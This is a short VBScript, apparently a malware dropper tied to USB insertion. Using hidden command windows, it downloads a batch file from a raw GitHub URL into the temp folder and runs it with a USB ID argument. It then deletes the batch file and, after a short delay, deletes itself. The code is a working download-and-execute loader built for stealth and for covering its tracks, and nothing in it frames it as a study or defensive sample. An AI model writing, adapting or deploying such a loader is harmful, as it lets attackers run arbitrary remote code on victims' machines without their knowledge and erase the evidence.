Set WshShell = CreateObject("WScript.Shell")
Set fso = CreateObject("Scripting.FileSystemObject")
Dim tmp: tmp = fso.GetSpecialFolder(2)
Dim bat: bat = tmp & "\p.bat"
Dim id

If WScript.Arguments.Count > 0 Then
    id = WScript.Arguments(0)
Else
    id = "MANUAL"
End If

' Download bat from GitHub (hidden cmd, wait for completion)
WshShell.Run "cmd /c curl -s -o """ & bat & """ https://raw.githubusercontent.com/sislam2005/test/refs/heads/main/usb.bat", 0, True

' Run bat hidden with USB_ID, then delete bat
WshShell.Run "cmd /c call """ & bat & """ " & id & " & del /q """ & bat & """", 0, False

' Self-cleanup after short delay
WshShell.Run "cmd /c ping -n 3 127.0.0.1 >nul & del /q """ & WScript.ScriptFullName & """", 0, False
